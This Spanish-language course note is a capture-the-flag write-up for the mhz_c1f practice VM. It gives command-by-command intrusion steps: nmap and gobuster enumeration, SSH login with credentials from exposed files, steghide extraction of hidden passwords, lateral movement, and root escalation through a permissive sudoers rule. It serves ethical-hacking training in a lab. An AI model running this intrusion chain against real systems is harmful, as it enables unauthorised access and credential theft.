---
title: "🖥️ Máquina: mhz_c1f — Hacking Ético"
aliases:
  - mhz_c1f
  - Máquina mhz_c1f
  - VM mhz_c1f
  - Writeup mhz_c1f
tags:
  - ifct0109
  - hacking-etico
  - vms
  - linux
  - gobuster
  - esteganografia
  - steghide
  - privesc
  - sudoers
---

# 🖥️ Máquina: mhz_c1f

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Dificultad:** Conceptos Básicos  
> **Técnicas trabajadas:** Enumeración Web (Gobuster) · Gestión de credenciales · Esteganografía (Steghide) · Movimiento Lateral · Escalada de privilegios (`sudo ALL`)  
> **Descripción:** Escenario donde se combinan técnicas de enumeración web, extracción de credenciales desde ficheros expuestos, análisis de esteganografía en imágenes para pivoteo entre usuarios locales y escalada de privilegios en Linux.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.7`
* **`RHOST` (Víctima / mhz_c1f):** Ej. `10.0.0.11`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP de la máquina tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de Servicios y Puertos

El primer paso es descubrir qué puertos y servicios están activos en la máquina víctima.

### 1.1 Escaneo completo de puertos
```bash
nmap -sT -p- $RHOST
```
> **Resultado:** Se identifican dos servicios principales abiertos: **SSH (22)** y **HTTP (80)**.

### 1.2 Escaneo detallado de versiones y scripts
```bash
nmap -A -p22,80 $RHOST
```
> **Resultado:** Servidor web Apache en el puerto 80 y OpenSSH en el puerto 22. La página web raíz muestra la página por defecto de Apache.

---

## 🌐 Fase 2: Enumeración Web (Fuzzing con Gobuster)

Para descubrir directorios y archivos ocultos en el servidor web utilizamos **Gobuster** con extensiones comunes:

```bash
gobuster dir -u http://$RHOST -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

> [!info] 📄 Archivos Descubiertos
> El escaneo identifica varios archivos de texto interesantes: `notes.txt` y `remb.txt`.

Accedemos a los archivos directamente en el navegador o mediante cURL:
* `http://$RHOST/notes.txt`
* `http://$RHOST/remb.txt`

> [!example] 📝 Evidencia Encontrada
> Los archivos contienen pistas sobre usuarios y credenciales iniciales para conectarse al sistema.

---

## 🔐 Fase 3: Acceso Inicial por SSH

Con las credenciales descubiertas en los archivos expuestos, iniciamos sesión mediante SSH:

```bash
ssh <usuario_inicial>@$RHOST
```

Una vez dentro, capturamos la primera bandera de usuario:

```bash
cat user.txt
```

---

## 🖼️ Fase 4: Esteganografía y Pivoteo de Usuarios

Explorando el sistema encontramos que existe otro usuario y una carpeta que contiene imágenes:

```bash
cat /etc/passwd
ls -la /home/mhz_c1f/Paintings
```

Salimos de la sesión SSH para volver a Kali Linux:
```bash
exit
```

Descargamos las imágenes a nuestra máquina atacante mediante **SCP**:
```bash
scp <usuario_inicial>@$RHOST:/home/mhz_c1f/Paintings/* ./
```

Instalamos la herramienta **steghide** en Kali:
```bash
sudo apt update && sudo apt install steghide -y
```

En una de las imágenes descargadas, utilizamos `steghide` para extraer información oculta:
```bash
steghide extract -sf "nombre_imagen.jpeg"
```

> [!info] 🔑 Clave Oculta
> La extracción no requiere contraseña y vuelca un archivo de texto oculto que contiene nuevas credenciales (`remb2.txt`).

Consultamos el contenido del archivo extraído:
```bash
cat remb2.txt
```

Iniciamos sesión por SSH con el usuario `first_stage`:
```bash
ssh first_stage@$RHOST
```

---

## 🚪 Fase 5: Movimiento Lateral

Con las credenciales intermedias, cambiamos al usuario `mhz_c1f`:

```bash
su mhz_c1f
```

Ahora tenemos acceso a un usuario con mayores privilegios en el sistema.

---

## 🚀 Fase 6: Escalada de Privilegios a Root

Revisamos los permisos especiales del usuario:

```bash
sudo -l
```

> [!info] 🔍 Configuración Sudoers
> El usuario `mhz_c1f` tiene asignado permiso `(ALL : ALL) ALL`, lo que le permite ejecutar cualquier comando como superusuario.

Para convertirnos en `root`:
```bash
sudo su
```

Una vez con privilegios de root, navegamos al directorio raíz y leemos la bandera final:

```bash
cd /root
ls -la
cat .root.txt
```

---

## 📝 Resumen del Flujo de Explotación (Kill Chain)

```text
[1. Nmap Scan]      ──► Puertos 80 (HTTP) y 22 (SSH)
                         │
[2. Gobuster]       ──► Descubrimiento de 'notes.txt' y 'remb.txt'
                         │
[3. SSH Login]      ──► Acceso con credenciales & captura de 'user.txt'
                         │
[4. SCP + Steghide] ──► Extracción de datos ocultos en imagen de Paintings
                         │
[5. Lateral Move]   ──► SSH con 'first_stage' ──► 'su mhz_c1f'
                         │
[6. sudo su]        ──► Permisos ALL en sudoers ──► Root & '.root.txt'
```

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🖥️ [[02 - MODULOS/Hacking Ético/Máquinas/Thoth|Máquina Thoth]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
